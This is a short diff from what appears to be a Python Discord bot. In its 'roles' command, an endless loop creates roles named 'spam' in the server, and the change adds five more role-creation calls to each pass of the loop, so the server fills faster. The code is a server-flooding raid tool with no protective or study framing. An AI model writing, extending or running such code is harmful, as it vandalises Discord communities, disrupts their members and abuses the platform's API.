@@ -65,6 +65,11 @@ async def roles(ctx):
     while True:
         guild = ctx.guild
         await guild.create_role(name="spam")
+        await guild.create_role(name="spam")
+        await guild.create_role(name="spam")
+        await guild.create_role(name="spam")
+        await guild.create_role(name="spam")
+        await guild.create_role(name="spam")
  
  
  
